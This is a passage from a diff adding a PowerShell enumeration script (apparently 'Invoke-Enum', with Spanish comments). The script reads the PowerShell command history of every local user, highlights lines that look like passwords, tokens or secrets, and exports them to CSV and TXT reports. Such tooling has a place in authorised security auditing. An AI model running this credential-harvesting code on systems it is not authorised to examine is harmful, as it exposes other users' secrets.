+        $username = $userDir.Name
+        $historyPath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+        
+        Write-Host "`n[*] Verificando usuario: $username" -ForegroundColor White
+        
+        if (Test-Path $historyPath) {
+            Write-Host "[!] Historial encontrado para $username" -ForegroundColor Green
+            Write-Host "    Ruta: $historyPath" -ForegroundColor Yellow
+            
+            try {
+                # Leer las ultimas 20 lineas del historial
+                $historyContent = Get-Content -Path $historyPath -Tail 10 -ErrorAction Stop
+                Write-Host "    ultimos comandos:" -ForegroundColor Cyan
+                
+                $lineCount = 1
+                foreach ($line in $historyContent) {
+                    # Resaltar comandos potencialmente sensibles
+                    if ($line -match "password|pass|pwd|credencial|key|token|secret|login|user") {
+                        Write-Host "      $lineCount. $line" -ForegroundColor Red
+                    } else {
+                        Write-Host "      $lineCount. $line" -ForegroundColor Gray
+                    }
+                    $lineCount++
+                }
+                
+                # Agregar al reporte
+                Add-Finding -Category "PowerShell History" -Finding "History found for $username" -Risk "Medium" -Details "Path: $historyPath`nLast commands: `n$($historyContent -join "`n")"
+                
+            } catch {
+                Write-Host "    [!] Error leyendo el historial: $($_.Exception.Message)" -ForegroundColor DarkGray
+            }
+        } else {
+            Write-Host "[*] No se encontro historial para $username" -ForegroundColor DarkGray
+            Add-Finding -Category "PowerShell History" -Finding "No history for $username" -Risk "Info" -Details "No PowerShell history file found for this user"
+        }
+    }
+} else {
+    Write-Host "[!] No se pudieron enumerar los directorios de usuario en C:\Users" -ForegroundColor Red
+}
+
+# También buscar historial en la carpeta actual del usuario
+$currentUserHistory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $currentUserHistory) {
+    Write-Host "`n[*] Historial del usuario actual ($env:USERNAME):" -ForegroundColor Green
+    try {
+        $currentHistory = Get-Content -Path $currentUserHistory -Tail 10 -ErrorAction Stop
+        foreach ($line in $currentHistory) {
+            if ($line -match "password|pass|pwd|credencial|key|token|secret") {
+                Write-Host "  [!] $line" -ForegroundColor Red
+            } else {
+                Write-Host "  $line" -ForegroundColor Gray
+            }
+        }
+    } catch {
+        Write-Host "  [!] Error leyendo historial actual: $($_.Exception.Message)" -ForegroundColor DarkGray
+    }
+} else {
+    Write-Host "`n[*] No se encontro historial para el usuario actual" -ForegroundColor DarkGray
+}
+
+Write-Host "`n[+] Nota: El historial completo puede contener informacion sensible como:" -ForegroundColor Yellow
+Write-Host "    - passwords en texto plano" -ForegroundColor Red
+Write-Host "    - Comandos de conexion a sistemas" -ForegroundColor Red
+Write-Host "    - Credenciales de API" -ForegroundColor Red
+Write-Host "    - Rutas de archivos sensibles" -ForegroundColor Red
+
+
+# ================= EXPORTACIoN DE RESULTADOS =================
+Show-Section "Exporting Results"
+
+Try {
+    # Export to CSV
+    $csvPath = "$outputFile.csv"
+    $global:Findings | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
+    Write-Host "[+] Resultados exportados a CSV: $csvPath" -ForegroundColor Green
+    
+    # Export to TXT
+    $txtPath = "$outputFile.txt"
+    $report = @()
+    $report += "======== INVOKE-ENUM REPORT ========"
+    $report += "Generated: $(Get-Date)"
+    $report += "Computer: $env:COMPUTERNAME"
+    $report += "User: $env:USERNAME"
+    $report += "=====================================`n"
+    
+    foreach ($finding in $global:Findings) {
+        $report += "[$($finding.Timestamp)] [$($finding.Category)] [$($finding.RiskLevel)]"
+        $report += "Finding: $($finding.Finding)"
+        $report += "Details: $($finding.Details)"
+        $report += "-------------------------------------"
+    }
+    
+    $report | Out-File -FilePath $txtPath -Encoding UTF8
+    Write-Host "[+] Reporte completo exportado a TXT: $txtPath" -ForegroundColor Green
+    
+} catch {
+    Write-Host "[!] Error exportando resultados: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+# ================= TIEMPO DE EJECUCIoN =================
+$endTime = Get-Date
+$duration = $endTime - $startTime
+Write-Host "`n==========================================" -ForegroundColor Green
+Write-Host "Ejecucion completada en: $($duration.ToString('mm\:ss')) minutos" -ForegroundColor Green
+Write-Host "Total de hallazgos: $($global:Findings.Count)" -ForegroundColor Green
+Write-Host "Archivos generados: $outputFile.{csv,txt}" -ForegroundColor Green
+Write-Host "==========================================" -ForegroundColor Green
